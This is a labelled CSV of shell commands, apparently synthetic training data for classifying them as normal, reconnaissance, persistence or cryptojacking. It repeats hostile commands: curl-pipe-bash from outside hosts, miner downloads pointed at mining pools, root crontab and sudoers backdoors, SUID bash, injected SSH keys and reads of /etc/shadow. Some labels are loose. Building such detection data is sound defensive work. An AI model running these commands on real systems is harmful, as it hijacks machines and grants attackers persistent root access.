command,label
ps aux | grep root,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
cd /home/user && pwd,Normal
cat /var/log/syslog | grep error,Normal
nohup ./coinminer -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
echo 'checking system logs',Normal
crontab -e,Persistence
netstat -tulpn,Reconnaissance
curl -s http://bitbucket.org/miner.tar.gz | bash,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://github.com/syslogd | bash,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ls -la /var/log,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
cat /var/log/syslog | grep error,Normal
crontab -e,Persistence
ls -la /var/log,Normal
cat /var/log/syslog | grep error,Normal
wget http://bitbucket.org/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ls -la /var/log,Normal
whoami,Normal
ping -c 4 45.33.32.156,Normal
cat /etc/shadow,Reconnaissance
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
ip a && route -n,Reconnaissance
uname -a && id && w,Reconnaissance
ip a && route -n,Reconnaissance
whoami,Normal
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
ip a && route -n,Reconnaissance
history,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
wget http://192.168.1.50/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o nanopool.org:14433,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f coinminer; wget https://10.0.0.5/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
clear,Normal
echo 'checking system logs',Normal
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
cd /home/user && pwd,Normal
curl -s http://142.250.190.46/cron.sh | bash,Cryptojacking
cat /etc/passwd,Reconnaissance
cd /home/user && pwd,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://142.250.190.46/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
netstat -tulpn,Reconnaissance
ls -la /var/log,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
curl -s http://192.168.1.50/cron.sh | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
echo 'checking system logs',Normal
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
nohup ./coinminer -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
wget http://45.33.32.156/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
echo 'checking system logs',Normal
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
history,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
netstat -tulpn,Reconnaissance
cat /var/log/syslog | grep error,Normal
wget http://192.168.1.50/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o nanopool.org:14433,Cryptojacking
history,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
wget http://142.250.190.46/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
chmod u+s /bin/bash,Persistence
top -n 1,Normal
curl -s http://192.168.1.50/cron.sh | bash,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
whoami,Normal
htop,Normal
netstat -tulpn,Reconnaissance
ls -la /var/log,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
chmod u+s /bin/bash,Persistence
curl -s http://185.12.33.1/update.sh | bash,Cryptojacking
crontab -e,Persistence
cd /home/user && pwd,Normal
echo 'checking system logs',Normal
ping -c 4 192.168.1.50,Normal
crontab -e,Persistence
ps aux | grep root,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://142.250.190.46/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
cat /var/log/syslog | grep error,Normal
ip a && route -n,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ip a && route -n,Reconnaissance
whoami,Normal
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
ls -la /var/log,Normal
clear,Normal
wget http://142.250.190.46/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o xmrpool.eu:9000,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
top -n 1,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
cat /var/log/syslog | grep error,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
ip a && route -n,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://45.33.32.156/update.sh | bash,Cryptojacking
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
clear,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
ping -c 4 10.0.0.5,Normal
ip a && route -n,Reconnaissance
cat /etc/shadow,Reconnaissance
ps aux | grep root,Reconnaissance
echo 'checking system logs',Normal
ping -c 4 bitbucket.org,Normal
echo 'checking system logs',Normal
sudo apt-get update && sudo apt-get upgrade,Normal
ps aux | grep root,Reconnaissance
ls -la /var/log,Normal
uname -a && id && w,Reconnaissance
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
wget http://bitbucket.org/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o nanopool.org:14433,Cryptojacking
crontab -e,Persistence
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://185.12.33.1/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./kdevtmpfsi -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://192.168.1.50/syslogd | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f minerd; wget https://45.33.32.156/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/passwd,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
chmod u+s /bin/bash,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'checking system logs',Normal
htop,Normal
curl -s http://github.com/install.sh | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
cd /home/user && pwd,Normal
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
history,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
crontab -e,Persistence
ps aux | grep root,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
ls -la /var/log,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
echo 'checking system logs',Normal
netstat -tulpn,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ping -c 4 10.0.0.5,Normal
htop,Normal
nohup ./xmr-stak -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
ping -c 4 github.com,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ls -la /var/log,Normal
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
netstat -tulpn,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://bitbucket.org/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
wget http://192.168.1.50/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cd /home/user && pwd,Normal
history,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /etc/passwd,Reconnaissance
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/shadow,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
cat /etc/passwd,Reconnaissance
nohup ./kdevtmpfsi -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
top -n 1,Normal
whoami,Normal
ls -la /var/log,Normal
ping -c 4 45.33.32.156,Normal
cat /var/log/syslog | grep error,Normal
wget http://github.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o nanopool.org:14433,Cryptojacking
ip a && route -n,Reconnaissance
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
uname -a && id && w,Reconnaissance
whoami,Normal
curl -s http://bitbucket.org/cron.sh | bash,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/shadow,Reconnaissance
cat /var/log/syslog | grep error,Normal
wget http://192.168.1.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o monerohash.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
uname -a && id && w,Reconnaissance
whoami,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmr-stak -o minexmr.com:443' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
cat /etc/passwd,Reconnaissance
ping -c 4 bitbucket.org,Normal
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cd /home/user && pwd,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /etc/shadow,Reconnaissance
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/passwd,Reconnaissance
netstat -tulpn,Reconnaissance
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://github.com/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./kdevtmpfsi -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
cd /home/user && pwd,Normal
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ip a && route -n,Reconnaissance
crontab -e,Persistence
netstat -tulpn,Reconnaissance
clear,Normal
ip a && route -n,Reconnaissance
nohup ./minerd -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
wget http://10.0.0.5/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o pool.supportxmr.com:3333,Cryptojacking
chmod u+s /bin/bash,Persistence
nohup ./coinminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
whoami,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ip a && route -n,Reconnaissance
ping -c 4 185.12.33.1,Normal
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
cat /etc/passwd,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
uname -a && id && w,Reconnaissance
curl -s http://10.0.0.5/update.sh | bash,Cryptojacking
chmod u+s /bin/bash,Persistence
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
ps aux | grep root,Reconnaissance
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
crontab -e,Persistence
wget http://192.168.1.50/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.supportxmr.com:3333,Cryptojacking
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
whoami,Normal
crontab -e,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
ps aux | grep root,Reconnaissance
htop,Normal
cd /home/user && pwd,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
history,Normal
chmod u+s /bin/bash,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
curl -s http://github.com/cron.sh | bash,Cryptojacking
whoami,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://192.168.1.50/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f xmrig; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://bitbucket.org/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmr-stak -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
curl -s http://bitbucket.org/install.sh | bash,Cryptojacking
wget http://10.0.0.5/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
history,Normal
ping -c 4 10.0.0.5,Normal
ping -c 4 192.168.1.50,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
top -n 1,Normal
cd /home/user && pwd,Normal
whoami,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://45.33.32.156/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
top -n 1,Normal
crontab -e,Persistence
ip a && route -n,Reconnaissance
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
ls -la /var/log,Normal
nohup ./xmrig -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
wget http://142.250.190.46/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o pool.supportxmr.com:3333,Cryptojacking
nohup ./xmrig -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://185.12.33.1/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./kdevtmpfsi -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
uname -a && id && w,Reconnaissance
nohup ./xmr-stak -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/passwd,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
top -n 1,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
htop,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ping -c 4 github.com,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://github.com/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./cpuminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
uname -a && id && w,Reconnaissance
uname -a && id && w,Reconnaissance
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
ls -la /var/log,Normal
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
wget http://github.com/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o xmrpool.eu:9000,Cryptojacking
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
whoami,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ip a && route -n,Reconnaissance
wget http://bitbucket.org/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o monerohash.com:3333,Cryptojacking
ip a && route -n,Reconnaissance
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
cat /etc/shadow,Reconnaissance
nohup ./minerd -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
cat /etc/shadow,Reconnaissance
ps aux | grep root,Reconnaissance
history,Normal
whoami,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
crontab -e,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
cd /home/user && pwd,Normal
nohup ./xmr-stak -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ps aux | grep root,Reconnaissance
ping -c 4 10.0.0.5,Normal
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
curl -s http://185.12.33.1/cron.sh | bash,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./kdevtmpfsi -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
netstat -tulpn,Reconnaissance
htop,Normal
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
netstat -tulpn,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://github.com/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmr-stak -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ping -c 4 192.168.1.50,Normal
chmod u+s /bin/bash,Persistence
htop,Normal
crontab -e,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
